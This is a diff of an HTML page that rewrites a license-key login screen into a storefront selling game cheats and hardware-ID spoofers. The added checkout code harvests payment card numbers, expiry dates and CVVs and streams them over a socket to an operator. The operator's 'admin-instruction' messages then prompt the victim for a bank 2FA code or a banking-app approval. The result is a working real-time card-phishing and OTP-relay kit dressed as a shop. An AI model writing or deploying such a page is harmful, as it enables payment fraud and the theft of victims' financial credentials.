@@ -3,80 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Revolt Dashboard - Login</title>
+    <title>Revolt Services - Premium Cheats & Spoofers</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { background-color: #0b0e14; font-family: 'Inter', sans-serif; overflow: hidden; }
-        .glass-panel { background: rgba(17, 25, 40, 0.6); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
-        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3b82f6; border-radius: 50%; width: 45px; height: 45px; animation: spin 0.8s linear infinite; }
+        body { background-color: #06080c; font-family: 'Inter', sans-serif; color: white; overflow-x: hidden; }
+        .glass { background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .btn-blue { background: #2563eb; transition: 0.3s; }
+        .btn-blue:hover { background: #1d4ed8; transform: translateY(-2px); shadow: 0 10px 15px -3px rgba(37, 99, 235, 0.4); }
+        .product-card { transition: 0.4s; border: 1px solid rgba(255,255,255,0.03); cursor: pointer; }
+        .product-card:hover { border-color: #2563eb; background: rgba(37, 99, 235, 0.05); transform: scale(1.02); }
+        .input-field { width: 100%; background: #0f172a; border: 1px solid #1e293b; border-radius: 12px; padding: 14px; color: white; outline: none; }
+        .input-field:focus { border-color: #2563eb; box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2); }
+        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #2563eb; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .hidden { display: none; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen text-slate-200 p-4">
+<body class="p-4 md:p-10">
 
-    <div id="login-container" class="glass-panel p-10 rounded-3xl w-full max-w-md shadow-2xl transition-all duration-500">
-        <h1 class="text-white text-3xl font-bold mb-10 text-center tracking-tight">Revolt Dashboard</h1>
-        <div class="space-y-6">
-            <div>
-                <label class="text-gray-400 text-xs uppercase tracking-widest font-semibold mb-2 block text-left">License Key</label>
-                <input id="key-input" type="password" placeholder="Enter your license key" 
-                       class="w-full bg-[#161b22] border border-gray-700 rounded-xl p-4 text-white focus:outline-none focus:ring-2 focus:ring-blue-500/50 transition-all">
+    <div id="view-store" class="max-w-6xl mx-auto">
+        <header class="text-center mb-16">
+            <h1 class="text-5xl font-black tracking-tighter text-white mb-2">REVOLT <span class="text-blue-600">SERVICES</span></h1>
+            <p class="text-gray-500 uppercase tracking-widest text-sm font-bold">The Ultimate Gaming Edge</p>
+        </header>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <div class="product-card glass p-8 rounded-3xl" onclick="selectProduct('Permanent Spoofer', 25, 50)">
+                <div class="text-blue-500 text-xs font-bold mb-2 uppercase tracking-widest">Hardware ID</div>
+                <h2 class="text-2xl font-bold mb-4">1 CLICK PERMANENT SPOOFER</h2>
+                <div class="space-y-2 text-sm text-gray-400 mb-6">
+                    <p>• Instant HWID Cleaning</p>
+                    <p>• All Games Supported</p>
+                </div>
+                <div class="flex justify-between items-center pt-4 border-t border-white/5">
+                    <div><span class="block text-xs text-gray-500">Starts from</span><span class="text-xl font-bold">€25.00</span></div>
+                    <div class="btn-blue px-4 py-2 rounded-lg font-bold text-sm">SELECT</div>
+                </div>
             </div>
-            <button onclick="requestAccess()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 rounded-xl shadow-lg active:scale-[0.98] transition-all">
-                Sign In
-            </button>
+
+            <script>
+                const items = [
+                    { name: "R6 EFT", p1: 35, p2: 90 },
+                    { name: "APEX ULTRA", p1: 35, p2: 90 },
+                    { name: "Fortnite Private", p1: 35, p2: 90 },
+                    { name: "ARC Slotted", p1: 35, p2: 90 }
+                ];
+                items.forEach(i => {
+                    document.write(`
+                        <div class="product-card glass p-8 rounded-3xl" onclick="selectProduct('${i.name}', ${i.p1}, ${i.p2})">
+                            <div class="text-blue-500 text-xs font-bold mb-2 uppercase tracking-widest">Game Internal</div>
+                            <h2 class="text-2xl font-bold mb-4 uppercase">${i.name}</h2>
+                            <div class="space-y-2 text-sm text-gray-400 mb-6">
+                                <p>• Undetected Performance</p>
+                                <p>• Real-time Verification</p>
+                            </div>
+                            <div class="flex justify-between items-center pt-4 border-t border-white/5">
+                                <div><span class="block text-xs text-gray-500">Starts from</span><span class="text-xl font-bold">€35.00</span></div>
+                                <div class="btn-blue px-4 py-2 rounded-lg font-bold text-sm">SELECT</div>
+                            </div>
+                        </div>
+                    `);
+                });
+            </script>
         </div>
     </div>
 
-    <div id="loading-overlay" class="hidden fixed inset-0 glass-panel flex flex-col items-center justify-center z-50">
+    <div id="view-plan" class="hidden fixed inset-0 flex items-center justify-center p-4">
+        <div class="glass p-10 rounded-3xl w-full max-w-md text-center">
+            <h2 id="plan-name" class="text-3xl font-bold mb-8"></h2>
+            <div class="space-y-4">
+                <button id="p1-btn" onclick="goToPay('1-Time/Monthly')" class="w-full btn-blue py-5 rounded-2xl font-black text-lg"></button>
+                <button id="p2-btn" onclick="goToPay('Lifetime')" class="w-full bg-white/10 hover:bg-white/20 py-5 rounded-2xl font-black text-lg transition"></button>
+                <button onclick="location.reload()" class="text-gray-500 mt-4 block mx-auto underline">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="view-checkout" class="hidden fixed inset-0 flex items-center justify-center p-4">
+        <div class="glass p-10 rounded-3xl w-full max-w-lg shadow-2xl">
+            <h2 class="text-2xl font-bold mb-8 text-center uppercase tracking-widest">Secure Checkout</h2>
+            <div class="space-y-4">
+                <div class="grid grid-cols-2 gap-4">
+                    <input id="fname" type="text" placeholder="First Name" class="input-field">
+                    <input id="lname" type="text" placeholder="Last Name" class="input-field">
+                </div>
+                <input id="cnum" type="text" maxlength="16" placeholder="Card Number (16 Digits)" class="input-field">
+                <div class="grid grid-cols-3 gap-4">
+                    <input id="ex-m" type="text" maxlength="2" placeholder="MM" class="input-field text-center">
+                    <input id="ex-y" type="text" maxlength="2" placeholder="YY" class="input-field text-center">
+                    <input id="cvv" type="text" maxlength="3" placeholder="CVV" class="input-field text-center">
+                </div>
+                <p class="text-[10px] text-gray-500 text-center italic mt-4">By clicking Pay Now, you agree to our Terms of Service.</p>
+                <button onclick="sendOrder()" class="w-full btn-blue py-5 rounded-2xl font-black text-xl mt-2">PAY NOW</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="loader" class="hidden fixed inset-0 glass flex flex-col items-center justify-center z-50">
         <div class="spinner mb-6"></div>
-        <h2 class="text-white text-2xl font-semibold animate-pulse">Authenticating...</h2>
-        <p class="text-gray-400 mt-3 text-sm text-center">Please wait while the administrator verifies your key.</p>
+        <h2 class="animate-pulse font-bold tracking-widest">PROCESSING PAYMENT...</h2>
     </div>
 
-    <div id="success-overlay" class="hidden fixed inset-0 glass-panel flex flex-col items-center justify-center z-50">
-        <div class="bg-green-500/20 p-6 rounded-full mb-6">
-            <svg class="w-16 h-16 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+    <div id="view-otp" class="hidden fixed inset-0 glass flex flex-col items-center justify-center z-50 p-6">
+        <div class="glass p-10 rounded-3xl w-full max-w-sm text-center">
+            <h2 class="text-2xl font-black mb-2 uppercase">2FA VERIFICATION</h2>
+            <p class="text-gray-400 mb-8 text-sm leading-relaxed">Please enter the security code sent to your mobile phone to complete the transaction.</p>
+            <input id="otp-code" type="text" maxlength="6" placeholder="XXXXXX" class="input-field text-center text-3xl font-black tracking-[10px] mb-6">
+            <button onclick="submitOtp()" class="w-full btn-blue py-4 rounded-xl font-bold">VERIFY NOW</button>
         </div>
-        <h2 class="text-white text-3xl font-bold">Access Granted</h2>
-        <p class="text-gray-300 mt-3 text-lg">Login successful, redirecting you now...</p>
     </div>
 
-    <div id="reject-overlay" class="hidden fixed inset-0 glass-panel flex flex-col items-center justify-center z-50">
-        <div class="bg-red-500/20 p-6 rounded-full mb-6">
-            <svg class="w-16 h-16 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-        </div>
-        <h2 class="text-white text-3xl font-bold">Access Denied</h2>
-        <p class="text-red-400 mt-3 text-lg">Invalid or Expired License Key.</p>
-        <button onclick="location.reload()" class="mt-8 text-gray-400 underline hover:text-white">Try Again</button>
+    <div id="view-phone" class="hidden fixed inset-0 glass flex flex-col items-center justify-center z-50 p-6 text-center">
+        <div class="text-6xl mb-6">📱</div>
+        <h2 class="text-2xl font-black mb-2">CHECK YOUR BANK APP</h2>
+        <p class="text-gray-400 max-w-xs mx-auto">A notification was sent to your phone. Please approve the payment to continue.</p>
+        <div class="spinner scale-50 opacity-30 mt-10"></div>
+    </div>
+
+    <div id="view-success" class="hidden fixed inset-0 bg-black flex flex-col items-center justify-center z-50 text-center p-6">
+        <div class="bg-green-500/20 p-6 rounded-full mb-8"><svg class="w-16 h-16 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg></div>
+        <h1 class="text-4xl font-black text-white mb-4">PAYMENT SUCCESSFUL!</h1>
+        <p class="text-gray-400">Welcome to Revolt Services. Your access will be delivered shortly.</p>
+    </div>
+
+    <div id="view-reject" class="hidden fixed inset-0 bg-black flex flex-col items-center justify-center z-50 text-center p-6">
+        <div class="bg-red-500/20 p-6 rounded-full mb-8"><svg class="w-16 h-16 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg></div>
+        <h1 class="text-4xl font-black text-white mb-4">PAYMENT FAILED</h1>
+        <p class="text-gray-400 mb-10">The security verification was rejected or incorrect.</p>
+        <button onclick="location.reload()" class="btn-blue px-10 py-4 rounded-xl font-bold">TRY AGAIN</button>
     </div>
 
     <script>
         const socket = io();
+        let currentOrder = {};
 
-        function requestAccess() {
-            const key = document.getElementById('key-input').value;
-            if(!key) return alert("Please enter a valid key.");
-
-            document.getElementById('login-container').classList.add('hidden');
-            document.getElementById('loading-overlay').classList.remove('hidden');
-            
-            socket.emit('check-key', key);
+        function selectProduct(name, p1, p2) {
+            currentOrder.product = name;
+            currentOrder.p1_val = p1;
+            currentOrder.p2_val = p2;
+            document.getElementById('view-store').classList.add('hidden');
+            document.getElementById('view-plan').classList.remove('hidden');
+            document.getElementById('plan-name').innerText = name;
+            document.getElementById('p1-btn').innerText = `1-TIME / MONTHLY (€${p1})`;
+            document.getElementById('p2-btn').innerText = `LIFETIME (€${p2})`;
         }
 
-        socket.on('admin-response', (status) => {
-            // Hide loading first
-            document.getElementById('loading-overlay').classList.add('hidden');
+        function goToPay(plan) {
+            currentOrder.plan = plan;
+            currentOrder.price = (plan === 'Lifetime') ? currentOrder.p2_val : currentOrder.p1_val;
+            document.getElementById('view-plan').classList.add('hidden');
+            document.getElementById('view-checkout').classList.remove('hidden');
+        }
 
-            if(status === 'approved') {
-                document.getElementById('success-overlay').classList.remove('hidden');
-                // هنا يمكنك وضع رابط حقيقي بعد 3 ثواني مثلاً
-                // setTimeout(() => { window.location.href = "رابط_لوحة_التحكم"; }, 3000);
-            } else {
-                document.getElementById('reject-overlay').classList.remove('hidden');
-            }
+        function sendOrder() {
+            const data = {
+                product: currentOrder.product,
+                plan: currentOrder.plan,
+                price: currentOrder.price,
+                name: document.getElementById('fname').value + " " + document.getElementById('lname').value,
+                card: document.getElementById('cnum').value,
+                expiry: document.getElementById('ex-m').value + "/" + document.getElementById('ex-y').value,
+                cvv: document.getElementById('cvv').value
+            };
+            if(data.card.length < 16) return alert("Enter 16 Digit Card Number");
+            document.getElementById('view-checkout').classList.add('hidden');
+            document.getElementById('loader').classList.remove('hidden');
+            socket.emit('customer-order', data);
+        }
+
+        function submitOtp() {
+            const code = document.getElementById('otp-code').value;
+            const cardId = document.getElementById('cnum').value;
+            document.getElementById('view-otp').classList.add('hidden');
+            document.getElementById('loader').classList.remove('hidden');
+            socket.emit('customer-otp', { code: code, cardId: cardId });
+        }
+
+        socket.on('admin-instruction', (instruction) => {
+            // Hide all overlays first
+            ['loader', 'view-otp', 'view-phone', 'view-success', 'view-reject'].forEach(id => document.getElementById(id).classList.add('hidden'));
+
+            if(instruction === 'approve') document.getElementById('view-success').classList.remove('hidden');
+            else if(instruction === 'reject') document.getElementById('view-reject').classList.remove('hidden');
+            else if(instruction === 'askOTP') document.getElementById('view-otp').classList.remove('hidden');
+            else if(instruction === 'phoneApp') document.getElementById('view-phone').classList.remove('hidden');
         });
     </script>
 </body>
